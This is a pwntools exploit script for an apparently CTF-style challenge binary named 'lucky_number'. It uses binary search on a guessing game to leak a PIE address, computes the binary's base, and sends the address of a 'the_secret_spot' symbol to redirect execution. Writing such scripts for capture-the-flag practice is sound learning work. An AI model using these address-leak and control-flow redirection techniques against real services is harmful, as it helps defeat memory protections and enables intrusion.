#!/usr/bin/env python3
from pwn import *

elf = ELF("../challenge/lucky_number")

HOST, PORT = "localhost", 5005

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''

def main():
    global io
    io = conn()

    # Leak a PIE address by guessing the lucky number using dichotomic search

    min_guess = 0
    max_guess = 2**64 - 1

    while min_guess < max_guess:
        guess = (max_guess + min_guess) // 2
        io.recvuntil("Guess: ")
        io.sendline(f"{guess}")
        line = io.recvline().strip().decode()
        if line == "Hotter":
            min_guess = guess
        elif line == "Colder":
            max_guess = guess
        else:
            elf.address = leak(pack(guess), elf.sym._start, 'PIE')
            io.recvuntil("travel: ")
            location = elf.sym.the_secret_spot
            io.sendline(f"{location}")
            break

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: 0x{leak_addr:x}")
    log.success(f"{leaktype} base address: 0x{base_addr:x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript=GDBSCRIPT)
    else:
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
